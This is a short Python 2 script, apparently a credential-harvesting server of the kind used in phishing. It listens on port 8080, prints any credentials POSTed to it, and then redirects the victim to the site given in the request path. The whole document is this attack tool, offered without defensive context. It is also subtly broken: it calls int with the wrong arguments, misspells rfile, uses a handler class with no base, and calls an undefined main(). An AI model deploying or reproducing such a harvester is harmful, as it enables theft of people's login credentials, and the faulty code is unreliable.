import SimpleHTTPServer, SocketServer, urllib

def banner():
	print "[***]   Credential Server p127   [***}"

class CredRequestHandler():
	def do_POST(self):
		content_length = int(self, headers['Content-Length'])
		creds = self.rifle.read(content_length).decode('utf-8')
		print creds
		site = self.path[1:]
		self.send_response(301)
		self.send_header('Location', urllib.unquote(site))
		self.end_headers()

server= SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()

if __name__ == '__main__':
	main()
